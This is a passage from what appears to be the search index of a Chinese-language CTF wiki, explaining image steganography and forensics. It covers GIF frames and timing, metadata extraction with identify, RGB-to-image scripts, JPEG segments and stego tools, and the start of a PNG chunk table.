\u6587\u4ef6\u7684\u7ec4\u6210\u7ed3\u6784\uff1a</p> <p></p> <p>\u4e2d\u95f4\u7684\u90a3\u4e2a\u5927\u5757\u53ef\u4ee5\u88ab\u91cd\u590d\u4efb\u610f\u6b21</p>"},{"location":"misc/picture/gif/#_2","title":"\u6587\u4ef6\u5934","text":"<p>GIF \u7f72\u540d\uff08Signature\uff09\u548c\u7248\u672c\u53f7\uff08Version\uff09\u3002GIF \u7f72\u540d\u7528\u6765\u786e\u8ba4\u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u662f GIF \u683c\u5f0f\u7684\u6587\u4ef6\uff0c\u8fd9\u4e00\u90e8\u5206\u7531\u4e09\u4e2a\u5b57\u7b26\u7ec4\u6210\uff1a<code>GIF</code>\uff1b\u6587\u4ef6\u7248\u672c\u53f7\u4e5f\u662f\u7531\u4e09\u4e2a\u5b57\u8282\u7ec4\u6210\uff0c\u53ef\u4ee5\u4e3a <code>87a</code> \u6216 <code>89a</code>\u3002</p>"},{"location":"misc/picture/gif/#logical-screen-descriptor","title":"\u903b\u8f91\u5c4f\u5e55\u6807\u8bc6\u7b26\uff08Logical Screen Descriptor\uff09","text":"<p>Logical Screen Descriptor\uff08\u903b\u8f91\u5c4f\u5e55\u63cf\u8ff0\u7b26\uff09\u7d27\u8ddf\u5728 header \u540e\u9762\u3002\u8fd9\u4e2a\u5757\u544a\u8bc9 decoder\uff08\u89e3\u7801\u5668\uff09\u56fe\u7247\u9700\u8981\u5360\u7528\u7684\u7a7a\u95f4\u3002\u5b83\u7684\u5927\u5c0f\u56fa\u5b9a\u4e3a 7 \u4e2a\u5b57\u8282\uff0c\u4ee5 canvas width\uff08\u753b\u5e03\u5bbd\u5ea6\uff09\u548c canvas height\uff08\u753b\u5e03\u9ad8\u5ea6\uff09\u5f00\u59cb\u3002</p>"},{"location":"misc/picture/gif/#global-color-table","title":"\u5168\u5c40\u989c\u8272\u5217\u8868\uff08Global Color Table\uff09","text":"<p>GIF\u683c\u5f0f\u53ef\u4ee5\u62e5\u6709global color table\uff0c\u6216\u7528\u4e8e\u9488\u5bf9\u6bcf\u4e2a\u5b50\u56fe\u7247\u96c6\uff0c\u63d0\u4f9blocal color table\u3002\u6bcf\u4e2acolor table\u7531\u4e00\u4e2aRGB\uff08\u5c31\u50cf\u901a\u5e38\u6211\u4eec\u89c1\u5230\u7684\uff08255\uff0c0\uff0c0\uff09\u7ea2\u8272 \u90a3\u79cd\uff09\u5217\u8868\u7ec4\u6210\u3002</p>"},{"location":"misc/picture/gif/#image-descriptor","title":"\u56fe\u50cf\u6807\u8bc6\u7b26\uff08Image Descriptor\uff09","text":"<p>\u4e00\u4e2a GIF \u6587\u4ef6\u4e00\u822c\u5305\u542b\u591a\u4e2a\u56fe\u7247\u3002\u4e4b\u524d\u7684\u56fe\u7247\u6e32\u67d3\u6a21\u5f0f\u4e00\u822c\u662f\u5c06\u591a\u4e2a\u56fe\u7247\u7ed8\u5236\u5230\u4e00\u4e2a\u5927\u7684\uff08virtual canvas\uff09\u865a\u62df\u753b\u5e03\u4e0a\uff0c\u800c\u73b0\u5728\u4e00\u822c\u5c06\u8fd9\u4e9b\u56fe\u7247\u96c6\u7528\u4e8e\u5b9e\u73b0\u52a8\u753b\u3002</p> <p>\u6bcf\u4e2a image \u90fd\u4ee5\u4e00\u4e2a image descriptor block\uff08\u56fe\u50cf\u63cf\u8ff0\u5757\uff09\u4f5c\u4e3a\u5f00\u5934\uff0c\u8fd9\u4e2a\u5757\u56fa\u5b9a\u4e3a 10 \u5b57\u8282\u3002</p> <p></p>"},{"location":"misc/picture/gif/#image-data","title":"\u56fe\u50cf\u6570\u636e\uff08Image Data\uff09","text":"<p>\u7ec8\u4e8e\u5230\u4e86\u56fe\u7247\u6570\u636e\u5b9e\u9645\u5b58\u50a8\u7684\u5730\u65b9\u3002Image Data\u662f\u7531\u4e00\u7cfb\u5217\u7684\u8f93\u51fa\u7f16\u7801\uff08output codes\uff09\u6784\u6210\uff0c\u5b83\u4eec\u544a\u8bc9decoder\uff08\u89e3\u7801\u5668\uff09\u9700\u8981\u7ed8\u5236\u5728\u753b\u5e03\u4e0a\u7684\u6bcf\u4e2a\u989c\u8272\u4fe1\u606f\u3002\u8fd9\u4e9b\u7f16\u7801\u4ee5\u5b57\u8282\u7801\u7684\u5f62\u5f0f\u7ec4\u7ec7\u5728\u8fd9\u4e2a\u5757\u4e2d\u3002</p>"},{"location":"misc/picture/gif/#trailer","title":"\u6587\u4ef6\u7ec8\u7ed3\u5668\uff08Trailer\uff09","text":"<p>\u8be5\u5757\u4e3a\u4e00\u4e2a\u5355\u5b57\u6bb5\u5757\uff0c\u7528\u6765\u6307\u793a\u8be5\u6570\u636e\u6d41\u7684\u7ed3\u675f\u3002\u53d6\u56fa\u5b9a\u503c0x3b.</p> <p>\u66f4\u591a\u53c2\u89c1 gif \u683c\u5f0f\u56fe\u7247\u8be6\u7ec6\u89e3\u6790</p>"},{"location":"misc/picture/gif/#_3","title":"\u7a7a\u95f4\u8f74","text":"<p>\u7531\u4e8eGIF\u7684\u52a8\u6001\u7279\u6027\uff0c\u7531\u4e00\u5e27\u5e27\u7684\u56fe\u7247\u6784\u6210\uff0c\u6240\u4ee5\u6bcf\u4e00\u5e27\u7684\u56fe\u7247\uff0c\u591a\u5e27\u56fe\u7247\u95f4\u7684\u7ed3\u5408\uff0c\u90fd\u6210\u4e86\u9690\u85cf\u4fe1\u606f\u7684\u4e00\u79cd\u8f7d\u4f53\u3002</p> <p>\u5bf9\u4e8e\u9700\u8981\u5206\u79bb\u7684GIF\u6587\u4ef6,\u53ef\u4ee5\u4f7f\u7528<code>convert</code>\u547d\u4ee4\u5c06\u5176\u6bcf\u4e00\u5e27\u5206\u5272\u5f00\u6765</p> <p>``` sourceCode shell root in ~/Desktop/tmp \u03bb convert cake.gif cake.png root in ~/Desktop/tmp \u03bb ls cake-0.png  cake-1.png  cake-2.png  cake-3.png  cake.gif <pre><code>### \u4f8b\u9898\n\n&gt; WDCTF-2017:3-2\n\n\u6253\u5f00gif\u540e\uff0c\u601d\u8def\u5f88\u6e05\u6670\uff0c\u5206\u79bb\u6bcf\u4e00\u5e27\u56fe\u7247\u540e\uff0c\u5c06\u8d77\u5408\u5e76\u5f97\u5230\u5b8c\u6574\u7684\u4e8c\u7ef4\u7801\u5373\u53ef\n\n``` sourceCode python\nfrom  PIL import Image\n\n\nflag = Image.new(\"RGB\",(450,450))\n\nfor i in range(2):\n    for j in range(2):\n        pot = \"cake-{}.png\".format(j+i*2)\n        potImage = Image.open(pot)\n        flag.paste(potImage,(j*225,i*225))\nflag.save('./flag.png')\n</code></pre></p> <p>\u626b\u7801\u540e\u5f97\u5230\u4e00\u4e3216\u8fdb\u5236\u5b57\u7b26\u4e32</p> <p><code>03f30d0ab8c1aa5....74080006030908</code></p> <p>\u5f00\u5934<code>03f3</code>\u4e3a<code>pyc</code>\u6587\u4ef6\u7684\u5934\uff0c\u6062\u590d\u4e3a<code>python</code>\u811a\u672c\u540e\u76f4\u63a5\u8fd0\u884c\u5f97\u5230flag</p>"},{"location":"misc/picture/gif/#_4","title":"\u65f6\u95f4\u8f74","text":"<p>GIF\u6587\u4ef6\u6bcf\u4e00\u5e27\u95f4\u7684\u65f6\u95f4\u95f4\u9694\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4fe1\u606f\u9690\u85cf\u7684\u8f7d\u4f53\u3002</p> <p>\u4f8b\u5982\u5728\u5f53\u65f6\u5728XMan\u9009\u62d4\u8d5b\u51fa\u7684\u4e00\u9898</p> <p>XMAN-2017:100.gif</p> <p>\u901a\u8fc7<code>identify</code>\u547d\u4ee4\u6e05\u6670\u7684\u6253\u5370\u51fa\u6bcf\u4e00\u5e27\u7684\u65f6\u95f4\u95f4\u9694</p> <pre><code>$ identify -format \"%s %T \\n\" 100.gif\n0 66\n1 66\n2 20\n3 10\n4 20\n5 10\n6 10\n7 20\n8 20\n9 20\n10 20\n11 10\n12 20\n13 20\n14 10\n15 10\n</code></pre> <p>\u63a8\u65ad <code>20 &amp; 10</code>  \u5206\u522b\u4ee3\u8868 <code>0 &amp; 1</code>\uff0c\u63d0\u53d6\u6bcf\u4e00\u5e27\u95f4\u9694\u5e76\u8fdb\u884c\u8f6c\u5316\u3002</p> <pre><code>$ cat flag|cut -d ' ' -f 2|tr -d '66'|tr -d '\\n'|tr -d '0'|tr '2' '0'\n0101100001001101010000010100111001111011001110010011011000110101001101110011010101100010011001010110010101100100001101000110010001100101011000010011000100111000011001000110010101100100001101000011011100110011001101010011011000110100001100110110000101100101011000110110011001100001001100110011010101111101#\n</code></pre> <p>\u6700\u540e\u8f6c ASCII \u7801\u5f97\u5230 flag\u3002</p>"},{"location":"misc/picture/gif/#_5","title":"\u9690\u5199\u8f6f\u4ef6","text":"<ul> <li>F5-steganography</li> </ul>"},{"location":"misc/picture/introduction/","title":"\u56fe\u7247\u5206\u6790\u7b80\u4ecb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u56fe\u50cf\u6587\u4ef6\u80fd\u591f\u5f88\u597d\u5730\u5305\u542b\u9ed1\u5ba2\u6587\u5316\uff0c\u56e0\u6b64 CTF \u7ade\u8d5b\u4e2d\u7ecf\u5e38\u4f1a\u51fa\u73b0\u5404\u79cd\u56fe\u50cf\u6587\u4ef6\u3002</p> <p>\u56fe\u50cf\u6587\u4ef6\u6709\u591a\u79cd\u590d\u6742\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u7528\u4e8e\u5404\u79cd\u6d89\u53ca\u5230\u5143\u6570\u636e\u3001\u4fe1\u606f\u4e22\u5931\u548c\u65e0\u635f\u538b\u7f29\u3001\u6821\u9a8c\u3001\u9690\u5199\u6216\u53ef\u89c6\u5316\u6570\u636e\u7f16\u7801\u7684\u5206\u6790\u89e3\u5bc6\uff0c\u90fd\u662f Misc \u4e2d\u7684\u4e00\u4e2a\u5f88\u91cd\u8981\u7684\u51fa\u9898\u65b9\u5411\u3002\u6d89\u53ca\u5230\u7684\u77e5\u8bc6\u70b9\u5f88\u591a\uff08\u5305\u62ec\u57fa\u672c\u7684\u6587\u4ef6\u683c\u5f0f\uff0c\u5e38\u89c1\u7684\u9690\u5199\u624b\u6cd5\u53ca\u9690\u5199\u7528\u7684\u8f6f\u4ef6\uff09\uff0c\u6709\u7684\u5730\u65b9\u4e5f\u9700\u8981\u53bb\u8fdb\u884c\u6df1\u5165\u7684\u7406\u89e3\u3002</p>"},{"location":"misc/picture/introduction/#metadata","title":"\u5143\u6570\u636e\uff08Metadata\uff09","text":"<p>\u5143\u6570\u636e\uff08Metadata\uff09\uff0c\u53c8\u79f0\u4e2d\u4ecb\u6570\u636e\u3001\u4e2d\u7ee7\u6570\u636e\uff0c\u4e3a\u63cf\u8ff0\u6570\u636e\u7684\u6570\u636e\uff08Data about data\uff09\uff0c\u4e3b\u8981\u662f\u63cf\u8ff0\u6570\u636e\u5c5e\u6027\uff08property\uff09\u7684\u4fe1\u606f\uff0c\u7528\u6765\u652f\u6301\u5982\u6307\u793a\u5b58\u50a8\u4f4d\u7f6e\u3001\u5386\u53f2\u6570\u636e\u3001\u8d44\u6e90\u67e5\u627e\u3001\u6587\u4ef6\u8bb0\u5f55\u7b49\u529f\u80fd\u3002</p> <p>\u5143\u6570\u636e\u4e2d\u9690\u85cf\u4fe1\u606f\u5728\u6bd4\u8d5b\u4e2d\u662f\u6700\u57fa\u672c\u7684\u4e00\u79cd\u624b\u6cd5\uff0c\u901a\u5e38\u7528\u6765\u9690\u85cf\u4e00\u4e9b\u5173\u952e\u7684 <code>Hint</code> \u4fe1\u606f\u6216\u8005\u662f\u4e00\u4e9b\u91cd\u8981\u7684\u5982 <code>password</code> \u7b49\u4fe1\u606f\u3002</p> <p>\u8fd9\u7c7b\u5143\u6570\u636e\u4f60\u53ef\u4ee5 <code>\u53f3\u952e --&gt; \u5c5e\u6027</code> \u53bb\u67e5\u770b,\u4e5f\u53ef\u4ee5\u901a\u8fc7 <code>strings</code> \u547d\u4ee4\u53bb\u67e5\u770b\uff0c\u4e00\u822c\u6765\u8bf4\uff0c\u4e00\u4e9b\u9690\u85cf\u7684\u4fe1\u606f\uff08\u5947\u602a\u7684\u5b57\u7b26\u4e32\uff09\u5e38\u5e38\u51fa\u73b0\u5728\u5934\u90e8\u6216\u8005\u5c3e\u90e8\u3002</p> <p>\u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e00\u4e2a <code>identify</code> \u547d\u4ee4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u662f\u7528\u6765\u83b7\u53d6\u4e00\u4e2a\u6216\u591a\u4e2a\u56fe\u50cf\u6587\u4ef6\u7684\u683c\u5f0f\u548c\u7279\u6027\u3002</p> <p><code>-format</code> \u7528\u6765\u6307\u5b9a\u663e\u793a\u7684\u4fe1\u606f\uff0c\u7075\u6d3b\u4f7f\u7528\u5b83\u7684 <code>-format</code> \u53c2\u6570\u53ef\u4ee5\u7ed9\u89e3\u9898\u5e26\u6765\u4e0d\u5c11\u65b9\u4fbf\u3002format\u5404\u4e2a\u53c2\u6570\u5177\u4f53\u610f\u4e49</p>"},{"location":"misc/picture/introduction/#_2","title":"\u4f8b\u9898","text":"<p>Break In 2017 - Mysterious GIF</p> <p>\u8fd9\u9898\u7684\u4e00\u4e2a\u96be\u70b9\u662f\u53d1\u73b0\u5e76\u63d0\u53d6 GIF \u4e2d\u7684\u5143\u6570\u636e\uff0c\u9996\u5148 <code>strings</code> \u662f\u53ef\u4ee5\u89c2\u5bdf\u5230\u5f02\u5e38\u70b9\u7684\u3002</p> <pre><code>GIF89a\n   !!!\"\"\"###$$$%%%&amp;&amp;&amp;'''((()))***+++,,,---...///000111222333444555666777888999:::;;;&lt;&lt;&lt;===&gt;&gt;&gt;???@@@AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPPQQQRRRSSSTTTUUUVVVWWWXXXYYYZZZ[[[\\\\\\]]]^^^___```aaabbbcccdddeeefffggghhhiiijjjkkklllmmmnnnooopppqqqrrrssstttuuuvvvwwwxxxyyyzzz{{{|||}}}~~~\n4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172\nNETSCAPE2.0\nImageMagick\n...\n</code></pre> <p>\u8fd9\u91cc\u7684\u4e00\u4e3216\u8fdb\u5236\u5176\u5b9e\u662f\u85cf\u5728 GIF \u7684\u5143\u6570\u636e\u533a</p> <p>\u63a5\u4e0b\u6765\u5c31\u662f\u63d0\u53d6\uff0c\u4f60\u53ef\u4ee5\u9009\u62e9 Python\uff0c\u4f46\u662f\u5229\u7528 <code>identify</code> \u663e\u5f97\u66f4\u52a0\u4fbf\u6377</p> <pre><code>root in ~/Desktop/tmp \u03bb identify -format \"%s %c \\n\" Question.gif\n0 4d494945767749424144414e42676b71686b6947397730424151454641415343424b6b776767536c41674541416f4942415144644d4e624c3571565769435172\n1 5832773639712f377933536849507565707478664177525162524f72653330633655772f6f4b3877655a547834346d30414c6f75685634364b63514a6b687271\n...\n24 484b7735432b667741586c4649746d30396145565458772b787a4c4a623253723667415450574d35715661756278667362356d58482f77443969434c684a536f\n25 724b3052485a6b745062457335797444737142486435504646773d3d\n</code></pre> <p>\u5176\u4ed6\u8fc7\u7a0b\u8fd9\u91cc\u4e0d\u5728\u53d9\u8ff0\uff0c\u53ef\u53c2\u8003\u94fe\u63a5\u4e2d\u7684 Writeup</p>"},{"location":"misc/picture/introduction/#_3","title":"\u50cf\u7d20\u503c\u8f6c\u5316","text":"<p>\u770b\u770b\u8fd9\u4e2a\u6587\u4ef6\u91cc\u7684\u6570\u636e\uff0c\u4f60\u80fd\u60f3\u5230\u4ec0\u4e48\uff1f</p> <pre><code>255,255,255,255,255...........\n</code></pre> <p>\u662f\u4e00\u4e32 RGB \u503c\uff0c\u5c1d\u8bd5\u7740\u5c06\u4ed6\u8f6c\u5316\u4e3a\u56fe\u7247</p> <pre><code>from PIL import Image\nimport re\n\nx = 307 #x\u5750\u6807  \u901a\u8fc7\u5bf9txt\u91cc\u7684\u884c\u6570\u8fdb\u884c\u6574\u6570\u5206\u89e3\ny = 311 #y\u5750\u6807  x*y = \u884c\u6570\n\nrgb1 = [****]\nprint len(rgb1)/3\nm=0\nfor i in xrange(0,x):\n    for j in xrange(0,y):\n\n        line = rgb1[(3*m):(3*(m+1))]#\u83b7\u53d6\u4e00\u884c\n        m+=1\n        rgb = line\n\n        im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb\u8f6c\u5316\u4e3a\u50cf\u7d20\nim.show()\nim.save(\"flag.png\")\n</code></pre> <p>\u800c\u5982\u679c\u53cd\u8fc7\u6765\u7684\u8bdd\uff0c\u4ece\u4e00\u5f20\u56fe\u7247\u63d0\u53d6 RGB \u503c\uff0c\u518d\u5bf9 RGB \u503c\u53bb\u8fdb\u884c\u4e00\u4e9b\u5bf9\u6bd4\uff0c\u4ece\u800c\u5f97\u5230\u6700\u7ec8\u7684 flag\u3002</p> <p>\u8fd9\u7c7b\u9898\u76ee\u5927\u90e8\u5206\u90fd\u662f\u4e00\u4e9b\u50cf\u7d20\u5757\u7ec4\u6210\u7684\u56fe\u7247\uff0c\u5982\u4e0b\u56fe</p> <p></p> <p>\u76f8\u5173\u9898\u76ee:</p> <ul> <li>CSAW-2016-quals:Forensic/Barinfun</li> <li>breakin-ctf-2017:A-dance-partner</li> </ul>"},{"location":"misc/picture/jpg/","title":"JPG","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/picture/jpg/#_1","title":"\u6587\u4ef6\u7ed3\u6784","text":"<ul> <li>JPEG \u662f\u6709\u635f\u538b\u7f29\u683c\u5f0f\uff0c\u5c06\u50cf\u7d20\u4fe1\u606f\u7528 JPEG \u4fdd\u5b58\u6210\u6587\u4ef6\u518d\u8bfb\u53d6\u51fa\u6765\uff0c\u5176\u4e2d\u67d0\u4e9b\u50cf\u7d20\u503c\u4f1a\u6709\u5c11\u8bb8\u53d8\u5316\u3002\u5728\u4fdd\u5b58\u65f6\u6709\u4e2a\u8d28\u91cf\u53c2\u6570\u53ef\u5728 0 \u81f3 100 \u4e4b\u95f4\u9009\u62e9\uff0c\u53c2\u6570\u8d8a\u5927\u56fe\u7247\u5c31\u8d8a\u4fdd\u771f\uff0c\u4f46\u56fe\u7247\u7684\u4f53\u79ef\u4e5f\u5c31\u8d8a\u5927\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\u9009\u62e9 70 \u6216 80 \u5c31\u8db3\u591f\u4e86</li> <li>JPEG \u6ca1\u6709\u900f\u660e\u5ea6\u4fe1\u606f</li> </ul> <p>JPG \u57fa\u672c\u6570\u636e\u7ed3\u6784\u4e3a\u4e24\u5927\u7c7b\u578b\uff1a\u300c\u6bb5\u300d\u548c\u7ecf\u8fc7\u538b\u7f29\u7f16\u7801\u7684\u56fe\u50cf\u6570\u636e\u3002</p> \u540d \u79f0 \u5b57\u8282\u6570 \u6570\u636e \u8bf4\u660e \u6bb5 \u6807\u8bc6 1 FF \u6bcf\u4e2a\u65b0\u6bb5\u7684\u5f00\u59cb\u6807\u8bc6 \u6bb5\u7c7b\u578b 1 \u7c7b\u578b\u7f16\u7801\uff08\u79f0\u4f5c\u6807\u8bb0\u7801\uff09 \u6bb5\u957f \u5ea6 2 \u5305\u62ec\u6bb5\u5185\u5bb9\u548c\u6bb5\u957f\u5ea6\u672c\u8eab,\u4e0d\u5305\u62ec\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b \u6bb5\u5185\u5bb9 2 \u226465533\u5b57\u8282 <ul> <li>\u6709\u4e9b\u6bb5\u6ca1\u6709\u957f\u5ea6\u63cf\u8ff0\u4e5f\u6ca1\u6709\u5185\u5bb9\uff0c\u53ea\u6709\u6bb5\u6807\u8bc6\u548c\u6bb5\u7c7b\u578b\u3002\u6587\u4ef6\u5934\u548c\u6587\u4ef6\u5c3e\u5747\u5c5e\u4e8e\u8fd9\u79cd\u6bb5\u3002</li> <li>\u6bb5\u4e0e\u6bb5\u4e4b\u95f4\u65e0\u8bba\u6709\u591a\u5c11 <code>FF</code> \u90fd\u662f\u5408\u6cd5\u7684\uff0c\u8fd9\u4e9b <code>FF</code> \u79f0\u4e3a\u300c\u586b\u5145\u5b57\u8282\u300d\uff0c\u5fc5\u987b\u88ab\u5ffd\u7565\u6389\u3002</li> </ul> <p>\u4e00\u4e9b\u5e38\u89c1\u7684\u6bb5\u7c7b\u578b</p> <p></p> <p><code>0xffd8</code> \u548c <code>0xffd9</code>\u4e3a JPG \u6587\u4ef6\u7684\u5f00\u59cb\u7ed3\u675f\u7684\u6807\u5fd7\u3002</p>"},{"location":"misc/picture/jpg/#_2","title":"\u9690\u5199\u8f6f\u4ef6","text":""},{"location":"misc/picture/jpg/#stegdetect","title":"Stegdetect","text":"<p>\u901a\u8fc7\u7edf\u8ba1\u5206\u6790\u6280\u672f\u8bc4\u4f30 JPEG \u6587\u4ef6\u7684 DCT \u9891\u7387\u7cfb\u6570\u7684\u9690\u5199\u5de5\u5177, \u53ef\u4ee5\u68c0\u6d4b\u5230\u901a\u8fc7 JSteg\u3001JPHide\u3001OutGuess\u3001Invisible Secrets\u3001F5\u3001appendX \u548c Camouflage \u7b49\u8fd9\u4e9b\u9690\u5199\u5de5\u5177\u9690\u85cf\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u8fd8\u5177\u6709\u57fa\u4e8e\u5b57\u5178\u66b4\u529b\u7834\u89e3\u5bc6\u7801\u65b9\u6cd5\u63d0\u53d6\u901a\u8fc7 Jphide\u3001outguess \u548c jsteg-shell \u65b9\u5f0f\u5d4c\u5165\u7684\u9690\u85cf\u4fe1\u606f\u3002</p> <pre><code>-q \u4ec5\u663e\u793a\u53ef\u80fd\u5305\u542b\u9690\u85cf\u5185\u5bb9\u7684\u56fe\u50cf\u3002\n-n \u542f\u7528\u68c0\u67e5JPEG\u6587\u4ef6\u5934\u529f\u80fd\uff0c\u4ee5\u964d\u4f4e\u8bef\u62a5\u7387\u3002\u5982\u679c\u542f\u7528\uff0c\u6240\u6709\u5e26\u6709\u6279\u6ce8\u533a\u57df\u7684\u6587\u4ef6\u5c06\u88ab\u89c6\u4e3a\u6ca1\u6709\u88ab\u5d4c\u5165\u4fe1\u606f\u3002\u5982\u679cJPEG\u6587\u4ef6\u7684JFIF\u6807\u8bc6\u7b26\u4e2d\u7684\u7248\u672c\u53f7\u4e0d\u662f1.1\uff0c\u5219\u7981\u7528OutGuess\u68c0\u6d4b\u3002\n-s \u4fee\u6539\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\uff0c\u8be5\u503c\u7684\u9ed8\u8ba4\u503c\u4e3a1\u3002\u68c0\u6d4b\u7ed3\u679c\u7684\u5339\u914d\u5ea6\u4e0e\u68c0\u6d4b\u7b97\u6cd5\u7684\u654f\u611f\u5ea6\u6210\u6b63\u6bd4\uff0c\u7b97\u6cd5\u654f\u611f\u5ea6\u7684\u503c\u8d8a\u5927\uff0c\u68c0\u6d4b\u51fa\u7684\u53ef\u7591\u6587\u4ef6\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u53ef\u80fd\u6027\u8d8a\u5927\u3002\n-d \u6253\u5370\u5e26\u884c\u53f7\u7684\u8c03\u8bd5\u4fe1\u606f\u3002\n-t \u8bbe\u7f6e\u8981\u68c0\u6d4b\u54ea\u4e9b\u9690\u5199\u5de5\u5177\uff08\u9ed8\u8ba4\u68c0\u6d4bjopi\uff09\uff0c\u53ef\u8bbe\u7f6e\u7684\u9009\u9879\u5982\u4e0b\uff1a\nj \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jsteg\u5d4c\u5165\u7684\u3002\no \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528outguess\u5d4c\u5165\u7684\u3002\np \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528jphide\u5d4c\u5165\u7684\u3002\ni \u68c0\u6d4b\u56fe\u50cf\u4e2d\u7684\u4fe1\u606f\u662f\u5426\u662f\u7528invisible secrets\u5d4c\u5165\u7684\u3002\n</code></pre>"},{"location":"misc/picture/jpg/#jphs","title":"JPHS","text":"<p>JPEG \u56fe\u50cf\u7684\u4fe1\u606f\u9690\u85cf\u8f6f\u4ef6 JPHS\uff0c\u5b83\u662f\u7531 Allan Latham \u5f00\u53d1\u8bbe\u8ba1\u5b9e\u73b0\u5728 Windows \u548c Linux \u7cfb\u7edf\u5e73\u53f0\u9488\u5bf9\u6709\u635f\u538b\u7f29 JPEG \u6587\u4ef6\u8fdb\u884c\u4fe1\u606f\u52a0\u5bc6\u9690\u85cf\u548c\u63a2\u6d4b\u63d0\u53d6\u7684\u5de5\u5177\u3002\u8f6f\u4ef6\u91cc\u9762\u4e3b\u8981\u5305\u542b\u4e86\u4e24\u4e2a\u7a0b\u5e8f JPHIDE\u548c JPSEEK\u3002JPHIDE \u7a0b\u5e8f\u4e3b\u8981\u662f\u5b9e\u73b0\u5c06\u4fe1\u606f\u6587\u4ef6\u52a0\u5bc6\u9690\u85cf\u5230 JPEG \u56fe\u50cf\u529f\u80fd\uff0c\u800c JPSEEK \u7a0b\u5e8f\u4e3b\u8981\u5b9e\u73b0\u4ece\u7528 JPHIDE \u7a0b\u5e8f\u52a0\u5bc6\u9690\u85cf\u5f97\u5230\u7684 JPEG \u56fe\u50cf\u63a2\u6d4b\u63d0\u53d6\u4fe1\u606f\u6587\u4ef6\uff0cWindows \u7248\u672c\u7684 JPHS \u91cc\u7684 JPHSWIN \u7a0b\u5e8f\u5177\u6709\u56fe\u5f62\u5316\u64cd\u4f5c\u754c\u9762\u4e14\u5177\u5907 JPHIDE \u548c JPSEEK \u7684\u529f\u80fd\u3002</p>"},{"location":"misc/picture/jpg/#silenteye","title":"SilentEye","text":"<p>SilentEye is a cross-platform application design for an easy use of steganography, in this case hiding messages into pictures or sounds. It provides a pretty nice interface and an easy integration of new steganography algorithm and cryptography process by using a plug-ins system.</p>"},{"location":"misc/picture/png/","title":"PNG","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/picture/png/#_1","title":"\u6587\u4ef6\u683c\u5f0f","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a PNG \u6587\u4ef6\u6765\u8bf4\uff0c\u5176\u6587\u4ef6\u5934\u603b\u662f\u7531\u4f4d\u56fa\u5b9a\u7684\u5b57\u8282\u6765\u63cf\u8ff0\u7684\uff0c\u5269\u4f59\u7684\u90e8\u5206\u7531 3 \u4e2a\u4ee5\u4e0a\u7684 PNG \u7684\u6570\u636e\u5757\uff08Chunk\uff09\u6309\u7167\u7279\u5b9a\u7684\u987a\u5e8f\u7ec4\u6210\u3002</p> <p>\u6587\u4ef6\u5934 <code>89 50 4E 47 0D 0A 1A 0A</code> + \u6570\u636e\u5757 + \u6570\u636e\u5757 + \u6570\u636e\u5757\u2026\u2026</p>"},{"location":"misc/picture/png/#chunk","title":"\u6570\u636e\u5757CHUNk","text":"<p>PNG \u5b9a\u4e49\u4e86\u4e24\u79cd\u7c7b\u578b\u7684\u6570\u636e\u5757\uff0c\u4e00\u79cd\u662f\u79f0\u4e3a\u5173\u952e\u6570\u636e\u5757\uff08critical chunk\uff09\uff0c\u8fd9\u662f\u6807\u51c6\u7684\u6570\u636e\u5757\uff0c\u53e6\u4e00\u79cd\u53eb\u505a\u8f85\u52a9\u6570\u636e\u5757\uff08ancillary chunks\uff09\uff0c\u8fd9\u662f\u53ef\u9009\u7684\u6570\u636e\u5757\u3002\u5173\u952e\u6570\u636e\u5757\u5b9a\u4e49\u4e86 4 \u4e2a\u6807\u51c6\u6570\u636e\u5757\uff0c\u6bcf\u4e2a PNG \u6587\u4ef6\u90fd\u5fc5\u987b\u5305\u542b\u5b83\u4eec\uff0cPNG \u8bfb\u5199\u8f6f\u4ef6\u4e5f\u90fd\u5fc5\u987b\u8981\u652f\u6301\u8fd9\u4e9b\u6570\u636e\u5757\u3002</p> \u6570\u636e\u5757\u7b26\u53f7 \u6570\u636e\u5757\u540d\u79f0 \u591a\u6570\u636e\u5757 \u53ef\u9009\u5426 \u4f4d\u7f6e\u9650\u5236 IHDR \u6587\u4ef6\u5934\u6570\u636e\u5757 \u5426 \u5426 \u7b2c\u4e00\u5757 cHRM \u57fa\u8272\u548c\u767d\u8272\u70b9\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u548cIDAT\u4e4b\u524d gAMA \u56fe\u50cf\u03b3\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u548cIDAT\u4e4b\u524d sBIT \u6837\u672c\u6709\u6548\u4f4d\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u548cIDAT\u4e4b\u524d PLTE \u8c03\u8272\u677f\u6570\u636e\u5757 \u5426 \u662f \u5728IDAT\u4e4b\u524d bKGD \u80cc\u666f\u989c\u8272\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d hIST \u56fe\u50cf\u76f4\u65b9\u56fe\u6570\u636e\u5757 \u5426 \u662f \u5728PLTE\u4e4b\u540eIDAT\u4e4b\u524d tRNS 